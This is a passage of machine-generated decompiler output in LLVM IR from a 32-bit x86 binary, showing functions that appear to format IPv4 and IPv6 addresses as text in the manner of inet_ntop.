  %v4_8051984 = load i32, i32* %edi.global-to-local, align 4
  %v7_8051984 = add i32 %v4_8051984, 2
  store i32 %v7_8051984, i32* %edi.global-to-local, align 4
  %v0_8051986 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051986 = trunc i32 %v0_8051986 to i8
  %v3_8051986 = inttoptr i32 %v7_8051984 to i8*
  store i8 %v1_8051986, i8* %v3_8051986, align 1
  %v4_8051986 = load i32, i32* %edi.global-to-local, align 4
  %v5_8051986 = load i1, i1* @df, align 1
  %v6_8051986 = select i1 %v5_8051986, i32 -1, i32 1
  %v7_8051986 = add i32 %v6_8051986, %v4_8051986
  store i32 %v7_8051986, i32* @edi, align 4
  %v0_8051a1620 = load i32, i32* %ebp.global-to-local, align 4
  %v7_8051a1923 = icmp sgt i32 %v0_8051a1620, 3
  br i1 %v7_8051a1923, label %dec_label_pc_8051a1f, label %dec_label_pc_805198c

dec_label_pc_805198c:                             ; preds = %dec_label_pc_8051958, %dec_label_pc_80519f4
  %v0_8051a1624 = phi i32 [ %v0_8051a16, %dec_label_pc_80519f4 ], [ %v0_8051a1620, %dec_label_pc_8051958 ]
  %v0_8051990 = load i32, i32* @ecx, align 4
  %v1_8051990 = and i32 %v0_8051990, -256
  %v2_8051990 = or i32 %v1_8051990, 100
  store i32 %v2_8051990, i32* %ecx.global-to-local, align 4
  %v2_8051992 = add i32 %v0_8051a1624, %v0_8051962
  store i32 %v2_8051992, i32* %eax.global-to-local, align 4
  %v0_8051994 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051994 = add i32 %v0_8051994, 1
  store i32 %v1_8051994, i32* @esi, align 4
  store i32 %v0_8051994, i32* @edi, align 4
  %v1_805199d = inttoptr i32 %v2_8051992 to i8*
  %v2_805199d = load i8, i8* %v1_805199d, align 1
  %v3_805199d = zext i8 %v2_805199d to i32
  %v4_805199d = load i32, i32* @edx, align 4
  %v5_805199d = and i32 %v4_805199d, -65536
  %v6_805199d = or i32 %v5_805199d, %v3_805199d
  store i32 %v6_805199d, i32* %edx.global-to-local, align 4
  %div = udiv i8 %v2_805199d, 100
  %v6_80519a3 = zext i8 %div to i32
  %v4_80519a5 = or i32 %v6_80519a3, %v1_8051990
  store i32 %v4_80519a5, i32* %ecx.global-to-local, align 4
  %v1_80519a7 = or i32 %v4_80519a5, 48
  store i32 %v1_80519a7, i32* %eax.global-to-local, align 4
  %v1_80519aa = trunc i32 %v1_80519a7 to i8
  %v2_80519aa = load i32, i32* @esp, align 4
  %v4_80519aa = add i32 %v0_8051994, 43
  %v5_80519aa = add i32 %v4_80519aa, %v2_80519aa
  %v6_80519aa = inttoptr i32 %v5_80519aa to i8*
  store i8 %v1_80519aa, i8* %v6_80519aa, align 1
  %v0_80519ae = load i32, i32* %eax.global-to-local, align 4
  %v1_80519ae = trunc i32 %v0_80519ae to i8
  %v7_80519ae = icmp eq i8 %v1_80519ae, 48
  %v1_80519b0 = icmp eq i1 %v7_80519ae, false
  %v0_80519d6 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80519d6 = and i32 %v0_80519d6, -256
  %v2_80519d6 = or i32 %v1_80519d6, 10
  store i32 %v2_80519d6, i32* %ecx.global-to-local, align 4
  %v0_80519d8 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_80519d8, i32* %eax.global-to-local, align 4
  %v3_80519da = trunc i32 %v0_80519d8 to i16
  %v5_80519da = udiv i16 %v3_80519da, 10
  br i1 %v1_80519b0, label %dec_label_pc_80519d6, label %dec_label_pc_80519b2

dec_label_pc_80519b2:                             ; preds = %dec_label_pc_805198c
  %v9_80519b6 = and i32 %v0_80519d8, -65536
  %tmp = urem i16 %v5_80519da, 256
  store i32 10, i32* %ecx.global-to-local, align 4
  %div26 = udiv i16 %tmp, 10
  %v7_80519c3 = zext i16 %div26 to i32
  %v11_80519c3 = or i32 %v7_80519c3, %v9_80519b6
  store i32 %v11_80519c3, i32* %eax.global-to-local, align 4
  %tmp28 = urem i16 %tmp, 10
  %v12_80519c3 = zext i16 %tmp28 to i32
  %v1_80519c6 = or i32 %v12_80519c3, 48
  %v8_80519c6 = trunc i32 %v1_80519c6 to i8
  store i32 %v1_80519c6, i32* %edx.global-to-local, align 4
  %v2_80519c9 = load i32, i32* @esp, align 4
  %v3_80519c9 = load i32, i32* %ebx.global-to-local, align 4
  %v4_80519c9 = add i32 %v2_80519c9, 43
  %v5_80519c9 = add i32 %v4_80519c9, %v3_80519c9
  %v6_80519c9 = inttoptr i32 %v5_80519c9 to i8*
  store i8 %v8_80519c6, i8* %v6_80519c9, align 1
  %v0_80519cd = load i32, i32* %edx.global-to-local, align 4
  %v1_80519cd = trunc i32 %v0_80519cd to i8
  %v7_80519cd = icmp eq i8 %v1_80519cd, 48
  br i1 %v7_80519cd, label %dec_label_pc_80519f4, label %dec_label_pc_80519d2

dec_label_pc_80519d2:                             ; preds = %dec_label_pc_80519b2
  %v0_80519d2 = load i32, i32* @esi, align 4
  store i32 %v0_80519d2, i32* @edi, align 4
  br label %dec_label_pc_80519f4

dec_label_pc_80519d6:                             ; preds = %dec_label_pc_805198c
  %tmp29 = urem i16 %v5_80519da, 256
  %v3_80519dc = and i32 %v0_80519d8, -65536
  store i32 10, i32* %ecx.global-to-local, align 4
  %div27 = udiv i16 %tmp29, 10
  %v7_80519e7 = zext i16 %div27 to i32
  %v11_80519e7 = or i32 %v7_80519e7, %v3_80519dc
  store i32 %v11_80519e7, i32* %eax.global-to-local, align 4
  %tmp30 = urem i16 %tmp29, 10
  %v12_80519e7 = zext i16 %tmp30 to i32
  %v1_80519ea = or i32 %v12_80519e7, 48
  %v8_80519ea = trunc i32 %v1_80519ea to i8
  store i32 %v1_80519ea, i32* %edx.global-to-local, align 4
  %v0_80519ed = load i32, i32* %ebx.global-to-local, align 4
  %v1_80519ed = add i32 %v0_80519ed, 2
  store i32 %v1_80519ed, i32* @edi, align 4
  %v2_80519f0 = load i32, i32* @esp, align 4
  %v3_80519f0 = load i32, i32* @esi, align 4
  %v4_80519f0 = add i32 %v2_80519f0, 43
  %v5_80519f0 = add i32 %v4_80519f0, %v3_80519f0
  %v6_80519f0 = inttoptr i32 %v5_80519f0 to i8*
  store i8 %v8_80519ea, i8* %v6_80519f0, align 1
  br label %dec_label_pc_80519f4

dec_label_pc_80519f4:                             ; preds = %dec_label_pc_80519b2, %dec_label_pc_80519d2, %dec_label_pc_80519d6
  store i32 %v2_8051992, i32* %edx.global-to-local, align 4
  store i32 10, i32* @ecx, align 4
  %v0_80519fd = load i32, i32* @edi, align 4
  %v1_80519fd = add i32 %v0_80519fd, 2
  store i32 %v1_80519fd, i32* %ebx.global-to-local, align 4
  %v0_8051a00 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8051a00 = add i32 %v0_8051a00, 1
  store i32 %v1_8051a00, i32* %ebp.global-to-local, align 4
  %v2_8051a01 = load i8, i8* %v1_805199d, align 1
  %v3_8051a01 = zext i8 %v2_8051a01 to i32
  %v4_8051a01 = load i32, i32* %eax.global-to-local, align 4
  %v5_8051a01 = and i32 %v4_8051a01, -65536
  %v6_8051a01 = or i32 %v5_8051a01, %v3_8051a01
  store i32 %v6_8051a01, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_8051a07 = load i32, i32* @esp, align 4
  %v2_8051a07 = add i32 %v0_80519fd, 44
  %v3_8051a07 = add i32 %v2_8051a07, %v0_8051a07
  %v4_8051a07 = inttoptr i32 %v3_8051a07 to i8*
  store i8 46, i8* %v4_8051a07, align 1
  %v0_8051a0c = load i32, i32* @ecx, align 4
  %v1_8051a0c = load i32, i32* %eax.global-to-local, align 4
  %v2_8051a0c = urem i32 %v1_8051a0c, 65536
  %v3_8051a0c = load i32, i32* %edx.global-to-local, align 4
  %v4_8051a0c = mul i32 %v3_8051a0c, 65536
  %v5_8051a0c = or i32 %v4_8051a0c, %v2_8051a0c
  %v6_8051a0c = urem i32 %v0_8051a0c, 65536
  %v7_8051a0c = udiv i32 %v5_8051a0c, %v6_8051a0c
  %v8_8051a0c = urem i32 %v7_8051a0c, 65536
  %v10_8051a0c = and i32 %v1_8051a0c, -65536
  %v11_8051a0c = or i32 %v8_8051a0c, %v10_8051a0c
  store i32 %v11_8051a0c, i32* %eax.global-to-local, align 4
  %v12_8051a0c = urem i32 %v5_8051a0c, %v6_8051a0c
  %v14_8051a0c = and i32 %v3_8051a0c, -65536
  %v15_8051a0c = or i32 %v12_8051a0c, %v14_8051a0c
  %v1_8051a0f = add i32 %v15_8051a0c, 48
  %v8_8051a0f = trunc i32 %v1_8051a0f to i8
  store i32 %v1_8051a0f, i32* @edx, align 4
  %v2_8051a12 = load i32, i32* @esp, align 4
  %v3_8051a12 = load i32, i32* @edi, align 4
  %v4_8051a12 = add i32 %v2_8051a12, 43
  %v5_8051a12 = add i32 %v4_8051a12, %v3_8051a12
  %v6_8051a12 = inttoptr i32 %v5_8051a12 to i8*
  store i8 %v8_8051a0f, i8* %v6_8051a12, align 1
  %v0_8051a16 = load i32, i32* %ebp.global-to-local, align 4
  %v7_8051a19 = icmp sgt i32 %v0_8051a16, 3
  br i1 %v7_8051a19, label %dec_label_pc_8051a1f, label %dec_label_pc_805198c

dec_label_pc_8051a1f:                             ; preds = %dec_label_pc_80519f4, %dec_label_pc_8051958
  %v0_8051a1f = load i32, i32* @esp, align 4
  %v1_8051a1f = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051a1f = add i32 %v0_8051a1f, 42
  %v3_8051a1f = add i32 %v2_8051a1f, %v1_8051a1f
  %v4_8051a1f = inttoptr i32 %v3_8051a1f to i8*
  store i8 0, i8* %v4_8051a1f, align 1
  %v2_8051a27 = ptrtoint i32* %stack_var_-33 to i32
  store i32 %v2_8051a27, i32* %ebx.global-to-local, align 4
  store i32 %v2_8051a27, i32* %stack_var_-92, align 4
  %v1_8051a2c = bitcast i32* %stack_var_-33 to i8*
  %v2_8051a2c = call i32 @function_804d1ac(i8* %v1_8051a2c)
  store i32 %v2_8051a2c, i32* @eax, align 4
  %tmp25 = icmp ugt i32 %v2_8051a2c, %v0_805197b
  br i1 %tmp25, label %dec_label_pc_8051a3a, label %dec_label_pc_8051a49

dec_label_pc_8051a3a:                             ; preds = %dec_label_pc_8051a1f
  %v0_8051a3a = load i32, i32* %stack_var_-92, align 4
  %v1_8051a3a = call i32 @function_804b774(i32 %v0_8051a3a)
  %v1_8051a3f = inttoptr i32 %v1_8051a3a to i32*
  store i32 28, i32* %v1_8051a3f, align 4
  br label %dec_label_pc_8051a58

dec_label_pc_8051a49:                             ; preds = %dec_label_pc_8051a1f
  store i32 %v0_8051977, i32* %stack_var_-92, align 4
  %v2_8051a50 = inttoptr i32 %v0_8051977 to i8*
  %v3_8051a50 = call i32 @function_804d190(i8* %v2_8051a50, i32 %v2_8051a27)
  br label %dec_label_pc_8051a58

dec_label_pc_8051a58:                             ; preds = %dec_label_pc_8051a3a, %dec_label_pc_8051a49
  %storemerge = phi i32 [ %v3_8051a50, %dec_label_pc_8051a49 ], [ 0, %dec_label_pc_8051a3a ]
  %v0_8051a5f = phi i32 [ %v3_8051a50, %dec_label_pc_8051a49 ], [ 0, %dec_label_pc_8051a3a ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_805195a, i32* @esi, align 4
  store i32 %v0_8051959, i32* @edi, align 4
  ret i32 %v0_8051a5f

; uselistorder directives
  uselistorder i32 %v0_8051a16, { 1, 0 }
  uselistorder i32 %v3_8051a0c, { 1, 0 }
  uselistorder i32 %v1_8051a0c, { 1, 0 }
  uselistorder i32 %v1_80519ea, { 1, 0 }
  uselistorder i32 %v1_80519c6, { 1, 0 }
  uselistorder i32 %v0_80519d8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_80519a7, { 1, 0 }
  uselistorder i32 %v0_8051977, { 1, 0 }
  uselistorder i32* %stack_var_-33, { 0, 2, 1 }
  uselistorder i32* %stack_var_-92, { 1, 0, 2 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 4, 7, 5, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 42, { 1, 0 }
  uselistorder i16 10, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i8 48, { 0, 1, 9, 10, 2, 3, 4, 5, 8, 7, 6 }
  uselistorder i32 43, { 2, 3, 4, 5, 0, 6, 1 }
  uselistorder i32 100, { 4, 0, 2, 3, 1 }
  uselistorder i32 -65536, { 2, 3, 4, 1, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_8051a58, { 1, 0 }
  uselistorder label %dec_label_pc_80519f4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805198c, { 1, 0 }
}

define i32 @function_8051a60(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051a60:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-94 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v0_8051a61 = load i32, i32* @edi, align 4
  %v0_8051a62 = load i32, i32* @esi, align 4
  %v0_8051a63 = load i32, i32* @ebx, align 4
  %v15_8051a64 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v9_8051a6b = icmp eq i32 %arg1, 2
  br i1 %v9_8051a6b, label %dec_label_pc_8051a7b, label %dec_label_pc_8051a70

dec_label_pc_8051a70:                             ; preds = %dec_label_pc_8051a60
  %v9_8051a70 = icmp eq i32 %arg1, 10
  %v1_8051a73 = icmp eq i1 %v9_8051a70, false
  br i1 %v1_8051a73, label %dec_label_pc_8051c17, label %dec_label_pc_8051a93

dec_label_pc_8051a7b:                             ; preds = %dec_label_pc_8051a60
  store i32 %arg3, i32* @edx, align 4
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg2, i32* @eax, align 4
  %v3_8051a87 = call i32 @function_8051958(i32 %v0_8051a63, i32 %v0_8051a62, i32 %v0_8051a61)
  store i32 %v3_8051a87, i32* %eax.global-to-local, align 4
  store i32 %v3_8051a87, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051c24

dec_label_pc_8051a93:                             ; preds = %dec_label_pc_8051a70
  store i32 %arg1, i32* %stack_var_-112, align 4
  %v2_8051a98 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_8051a98, i32* %eax.global-to-local, align 4
  store i32 %v2_8051a98, i32* %stack_var_-124, align 4
  %v4_8051a9d = bitcast i32* %stack_var_-48 to i8*
  %v5_8051a9d = call i32 @function_804d178(i8* %v4_8051a9d, i32 0, i32 32)
  store i32 %v5_8051a9d, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_8051abf = add i32 %arg2, 1
  br label %dec_label_pc_8051aa9

dec_label_pc_8051aa9:                             ; preds = %dec_label_pc_8051aa9.dec_label_pc_8051aa9_crit_edge, %dec_label_pc_8051a93
  %v1_8051acc = phi i32 [ %v15_8051a64, %dec_label_pc_8051a93 ], [ %v1_8051acc.pre, %dec_label_pc_8051aa9.dec_label_pc_8051aa9_crit_edge ]
  %v0_8051ac768 = phi i32 [ 0, %dec_label_pc_8051a93 ], [ %v0_8051ad0.pre, %dec_label_pc_8051aa9.dec_label_pc_8051aa9_crit_edge ]
  %v1_8051ab2 = ashr i32 %v0_8051ac768, 31
  %v2_8051ab3 = zext i32 %v0_8051ac768 to i64
  %v4_8051ab3 = zext i32 %v1_8051ab2 to i64
  %v5_8051ab3 = mul nuw i64 %v4_8051ab3, 4294967296
  %v6_8051ab3 = or i64 %v5_8051ab3, %v2_8051ab3
  %v8_8051ab3 = sdiv i64 %v6_8051ab3, 2
  %v9_8051ab3 = trunc i64 %v8_8051ab3 to i32
  store i32 %v9_8051ab3, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  store i32 %v9_8051ab3, i32* %ebx.global-to-local, align 4
  %v2_8051abb = add i32 %v0_8051ac768, %arg2
  %v3_8051abb = inttoptr i32 %v2_8051abb to i8*
  %v4_8051abb = load i8, i8* %v3_8051abb, align 1
  %v5_8051abb = zext i8 %v4_8051abb to i32
  store i32 %v5_8051abb, i32* %eax.global-to-local, align 4
  %v3_8051abf = add i32 %v2_8051abf, %v0_8051ac768
  %v4_8051abf = inttoptr i32 %v3_8051abf to i8*
  %v5_8051abf = load i8, i8* %v4_8051abf, align 1
  %v6_8051abf = zext i8 %v5_8051abf to i32
  store i32 %v6_8051abf, i32* %edx.global-to-local, align 4
  %v2_8051ac4 = mul nuw nsw i32 %v5_8051abb, 256
  %v1_8051ac7 = add i32 %v0_8051ac768, 2
  store i32 %v1_8051ac7, i32* %ecx.global-to-local, align 4
  %v2_8051aca = or i32 %v6_8051abf, %v2_8051ac4
  store i32 %v2_8051aca, i32* %eax.global-to-local, align 4
  %v3_8051acc = mul i32 %v9_8051ab3, 4
  %v4_8051acc = add i32 %v3_8051acc, 60
  %v5_8051acc = add i32 %v4_8051acc, %v1_8051acc
  %v6_8051acc = inttoptr i32 %v5_8051acc to i32*
  store i32 %v2_8051aca, i32* %v6_8051acc, align 4
  %v0_8051ad0.pre = load i32, i32* %ecx.global-to-local, align 4
  %v7_8051ad3 = icmp sgt i32 %v0_8051ad0.pre, 15
  br i1 %v7_8051ad3, label %dec_label_pc_8051ad5, label %dec_label_pc_8051aa9.dec_label_pc_8051aa9_crit_edge

dec_label_pc_8051aa9.dec_label_pc_8051aa9_crit_edge: ; preds = %dec_label_pc_8051aa9
  %v1_8051acc.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051aa9

dec_label_pc_8051ad5:                             ; preds = %dec_label_pc_8051aa9
  %v4_8051a93 = ptrtoint i32* %stack_var_-112 to i32
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 -1, i32* @edi, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8051adf.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051adf

dec_label_pc_8051adf:                             ; preds = %dec_label_pc_8051ad5, %dec_label_pc_8051b0c
  %v0_8051b0c67 = phi i32 [ 0, %dec_label_pc_8051ad5 ], [ %v1_8051b0c, %dec_label_pc_8051b0c ]
  %v0_8051af766 = phi i32 [ -1, %dec_label_pc_8051ad5 ], [ %v0_8051af77, %dec_label_pc_8051b0c ]
  %v0_8051b1765 = phi i32 [ -1, %dec_label_pc_8051ad5 ], [ %v0_8051afc8, %dec_label_pc_8051b0c ]
  %v0_8051b2264 = phi i32 [ -1, %dec_label_pc_8051ad5 ], [ %v0_8051b0712, %dec_label_pc_8051b0c ]
  %v2_8051adf = mul nuw nsw i32 %v0_8051b0c67, 4
  %v3_8051adf = add nuw nsw i32 %v2_8051adf, 60
  %v4_8051adf = add i32 %v3_8051adf, %v0_8051adf.pre
  %v5_8051adf = inttoptr i32 %v4_8051adf to i32*
  %v6_8051adf = load i32, i32* %v5_8051adf, align 4
  %v7_8051adf = icmp eq i32 %v6_8051adf, 0
  %v1_8051ae4 = icmp eq i1 %v7_8051adf, false
  %v10_8051af7 = icmp eq i32 %v0_8051af766, -1
  br i1 %v1_8051ae4, label %dec_label_pc_8051af7, label %dec_label_pc_8051ae6

dec_label_pc_8051ae6:                             ; preds = %dec_label_pc_8051adf
  %v1_8051ae9 = icmp eq i1 %v10_8051af7, false
  br i1 %v1_8051ae9, label %dec_label_pc_8051af4, label %dec_label_pc_8051aeb

dec_label_pc_8051aeb:                             ; preds = %dec_label_pc_8051ae6
  store i32 %v0_8051b0c67, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051b0c

dec_label_pc_8051af4:                             ; preds = %dec_label_pc_8051ae6
  %v0_8051af4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051af4 = add i32 %v0_8051af4, 1
  store i32 %v1_8051af4, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051b0c

dec_label_pc_8051af7:                             ; preds = %dec_label_pc_8051adf
  br i1 %v10_8051af7, label %dec_label_pc_8051b0c, label %dec_label_pc_8051afc

dec_label_pc_8051afc:                             ; preds = %dec_label_pc_8051af7
  %v10_8051afc = icmp eq i32 %v0_8051b1765, -1
  %v0_8051b05.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051b01 = load i32, i32* @ebp, align 4
  %v7_8051b03 = icmp sgt i32 %v0_8051b05.pre, %v1_8051b01
  %or.cond = or i1 %v10_8051afc, %v7_8051b03
  br i1 %or.cond, label %dec_label_pc_8051b05, label %dec_label_pc_8051b09

dec_label_pc_8051b05:                             ; preds = %dec_label_pc_8051afc
  store i32 %v0_8051b05.pre, i32* @ebp, align 4
  store i32 %v0_8051b2264, i32* @edi, align 4
  br label %dec_label_pc_8051b09

dec_label_pc_8051b09:                             ; preds = %dec_label_pc_8051afc, %dec_label_pc_8051b05
  %v0_8051afc10 = phi i32 [ %v0_8051b2264, %dec_label_pc_8051b05 ], [ %v0_8051b1765, %dec_label_pc_8051afc ]
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051b0c

dec_label_pc_8051b0c:                             ; preds = %dec_label_pc_8051af7, %dec_label_pc_8051af4, %dec_label_pc_8051aeb, %dec_label_pc_8051b09
  %v0_8051b0712 = phi i32 [ %v0_8051b2264, %dec_label_pc_8051af7 ], [ %v0_8051b2264, %dec_label_pc_8051af4 ], [ %v0_8051b0c67, %dec_label_pc_8051aeb ], [ -1, %dec_label_pc_8051b09 ]
  %v0_8051af77 = phi i32 [ -1, %dec_label_pc_8051af7 ], [ %v0_8051af766, %dec_label_pc_8051af4 ], [ %v0_8051b0c67, %dec_label_pc_8051aeb ], [ -1, %dec_label_pc_8051b09 ]
  %v0_8051afc8 = phi i32 [ %v0_8051b1765, %dec_label_pc_8051af7 ], [ %v0_8051b1765, %dec_label_pc_8051af4 ], [ %v0_8051b1765, %dec_label_pc_8051aeb ], [ %v0_8051afc10, %dec_label_pc_8051b09 ]
  %v1_8051b0c = add nuw nsw i32 %v0_8051b0c67, 1
  store i32 %v1_8051b0c, i32* %edx.global-to-local, align 4
  %exitcond = icmp eq i32 %v1_8051b0c, 8
  br i1 %exitcond, label %dec_label_pc_8051b12, label %dec_label_pc_8051adf

dec_label_pc_8051b12:                             ; preds = %dec_label_pc_8051b0c
  %v10_8051b12 = icmp eq i32 %v0_8051b0712, -1
  br i1 %v10_8051b12, label %dec_label_pc_8051b24, label %dec_label_pc_8051b17

dec_label_pc_8051b17:                             ; preds = %dec_label_pc_8051b12
  %v10_8051b17 = icmp eq i32 %v0_8051afc8, -1
  %v0_8051b20.pre = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v10_8051b17, label %dec_label_pc_8051b20, label %dec_label_pc_8051b1c

dec_label_pc_8051b1c:                             ; preds = %dec_label_pc_8051b17
  %v1_8051b1c = load i32, i32* @ebp, align 4
  %v7_8051b1e = icmp sgt i32 %v0_8051b20.pre, %v1_8051b1c
  br i1 %v7_8051b1e, label %dec_label_pc_8051b20, label %dec_label_pc_8051b24.thread

dec_label_pc_8051b24.thread:                      ; preds = %dec_label_pc_8051b1c
  br label %dec_label_pc_8051b29

dec_label_pc_8051b20:                             ; preds = %dec_label_pc_8051b17, %dec_label_pc_8051b1c
  store i32 %v0_8051b20.pre, i32* @ebp, align 4
  store i32 %v0_8051b0712, i32* @edi, align 4
  br label %dec_label_pc_8051b24

dec_label_pc_8051b24:                             ; preds = %dec_label_pc_8051b12, %dec_label_pc_8051b20
  %v0_8051b24 = phi i32 [ %v0_8051afc8, %dec_label_pc_8051b12 ], [ %v0_8051b0712, %dec_label_pc_8051b20 ]
  %v10_8051b24 = icmp eq i32 %v0_8051b24, -1
  br i1 %v10_8051b24, label %dec_label_pc_8051b31, label %dec_label_pc_8051b24.dec_label_pc_8051b29_crit_edge

dec_label_pc_8051b24.dec_label_pc_8051b29_crit_edge: ; preds = %dec_label_pc_8051b24
  %v0_8051b29.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8051b29

dec_label_pc_8051b29:                             ; preds = %dec_label_pc_8051b24.dec_label_pc_8051b29_crit_edge, %dec_label_pc_8051b24.thread
  %v0_8051b29 = phi i32 [ %v1_8051b1c, %dec_label_pc_8051b24.thread ], [ %v0_8051b29.pre, %dec_label_pc_8051b24.dec_label_pc_8051b29_crit_edge ]
  %v0_8051b2445 = phi i32 [ %v0_8051afc8, %dec_label_pc_8051b24.thread ], [ %v0_8051b24, %dec_label_pc_8051b24.dec_label_pc_8051b29_crit_edge ]
  %v1_8051b29 = add i32 %v0_8051b29, -1
  %v6_8051b29 = sub i32 0, %v0_8051b29
  %v7_8051b29 = and i32 %v0_8051b29, %v6_8051b29
  %v8_8051b29 = icmp slt i32 %v7_8051b29, 0
  %v9_8051b29 = icmp eq i32 %v1_8051b29, 0
  %v10_8051b29 = icmp slt i32 %v1_8051b29, 0
  %v3_8051b2c = icmp eq i1 %v10_8051b29, %v8_8051b29
  %v4_8051b2c = icmp eq i1 %v9_8051b29, false
  %v5_8051b2c = and i1 %v4_8051b2c, %v3_8051b2c
  br i1 %v5_8051b2c, label %dec_label_pc_8051b31, label %dec_label_pc_8051b2e

dec_label_pc_8051b2e:                             ; preds = %dec_label_pc_8051b29
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_8051b31

dec_label_pc_8051b31:                             ; preds = %dec_label_pc_8051b29, %dec_label_pc_8051b24, %dec_label_pc_8051b2e
  %v0_8051bd117 = phi i32 [ %v0_8051b2445, %dec_label_pc_8051b29 ], [ -1, %dec_label_pc_8051b24 ], [ -1, %dec_label_pc_8051b2e ]
  %v2_8051b31 = ptrtoint i32* %stack_var_-94 to i32
  store i32 %v2_8051b31, i32* @ebx, align 4
  %v3_8051bb3 = add i32 %v4_8051a93, 64
  %v12_8051b71 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @esi, align 4
  %v10_8051bd157 = icmp eq i32 %v0_8051bd117, -1
  %v1_8051b79 = icmp eq i1 %v12_8051b71, false
  br label %dec_label_pc_8051b3c

dec_label_pc_8051b3c:                             ; preds = %dec_label_pc_8051b31, %dec_label_pc_8051bc7
  %v10_8051bd163 = phi i1 [ %v10_8051bd157, %dec_label_pc_8051b31 ], [ %v10_8051bd1, %dec_label_pc_8051bc7 ]
  %v0_8051b5662 = phi i32 [ 0, %dec_label_pc_8051b31 ], [ %v1_8051bc7, %dec_label_pc_8051bc7 ]
  %v1_8051b4c61 = phi i32 [ %v0_8051bd117, %dec_label_pc_8051b31 ], [ %v0_8051bd1.pre, %dec_label_pc_8051bc7 ]
  %v0_8051b5a60 = phi i32 [ %v2_8051b31, %dec_label_pc_8051b31 ], [ %v0_8051b5018, %dec_label_pc_8051bc7 ]
  %stack_var_-120.159 = phi i8* [ null, %dec_label_pc_8051b31 ], [ %stack_var_-120.0, %dec_label_pc_8051bc7 ]
  %stack_var_-116.158 = phi i32 [ 32, %dec_label_pc_8051b31 ], [ %stack_var_-116.0, %dec_label_pc_8051bc7 ]
  br i1 %v10_8051bd163, label %dec_label_pc_8051b56, label %dec_label_pc_8051b41

dec_label_pc_8051b41:                             ; preds = %dec_label_pc_8051b3c
  %v12_8051b41 = icmp eq i32 %v0_8051b5662, %v1_8051b4c61
  %v5_8051b43 = icmp slt i32 %v0_8051b5662, %v1_8051b4c61
  br i1 %v5_8051b43, label %dec_label_pc_8051b56, label %dec_label_pc_8051b45

dec_label_pc_8051b45:                             ; preds = %dec_label_pc_8051b41
  %v1_8051b45 = load i32, i32* @ebp, align 4
  %v2_8051b45 = add i32 %v1_8051b45, %v1_8051b4c61
  store i32 %v2_8051b45, i32* %eax.global-to-local, align 4
  %v5_8051b4a = icmp slt i32 %v0_8051b5662, %v2_8051b45
  br i1 %v5_8051b4a, label %dec_label_pc_8051b4c, label %dec_label_pc_8051b56

dec_label_pc_8051b4c:                             ; preds = %dec_label_pc_8051b45
  %v1_8051b4e = icmp eq i1 %v12_8051b41, false
  br i1 %v1_8051b4e, label %dec_label_pc_8051bc7, label %dec_label_pc_8051b50

dec_label_pc_8051b50:                             ; preds = %dec_label_pc_8051b4c
  %v1_8051b50 = inttoptr i32 %v0_8051b5a60 to i8*
  store i8 58, i8* %v1_8051b50, align 1
  %v0_8051b53 = load i32, i32* @ebx, align 4
  %v1_8051b53 = add i32 %v0_8051b53, 1
  store i32 %v1_8051b53, i32* @ebx, align 4
  br label %dec_label_pc_8051bc7

dec_label_pc_8051b56:                             ; preds = %dec_label_pc_8051b45, %dec_label_pc_8051b41, %dec_label_pc_8051b3c
  %v1_8051b56 = icmp eq i32 %v0_8051b5662, 0
  br i1 %v1_8051b56, label %dec_label_pc_8051b5e.thread, label %dec_label_pc_8051b5e

dec_label_pc_8051b5e.thread:                      ; preds = %dec_label_pc_8051b56
  br label %dec_label_pc_8051bb2

dec_label_pc_8051b5e:                             ; preds = %dec_label_pc_8051b56
  %v1_8051b5a = inttoptr i32 %v0_8051b5a60 to i8*
  store i8 58, i8* %v1_8051b5a, align 1
  %v0_8051b5d = load i32, i32* @ebx, align 4
  %v1_8051b5d = add i32 %v0_8051b5d, 1
  store i32 %v1_8051b5d, i32* @ebx, align 4
  %v0_8051b5e.pre = load i32, i32* @esi, align 4
